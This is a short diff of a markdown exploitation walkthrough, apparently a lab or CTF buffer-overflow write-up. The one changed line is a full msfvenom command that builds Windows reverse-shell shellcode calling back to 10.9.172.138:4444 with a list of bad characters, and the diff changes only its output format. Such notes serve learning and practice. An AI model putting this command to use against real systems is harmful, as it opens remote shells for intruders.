@@ -324,7 +324,7 @@ print("Exploit Done")
 **` Exploiting the System`**
 - generate shellcode using metasploit
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=10.9.172.138 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f python  
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.9.172.138 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c  
 `
 
 - TIPS
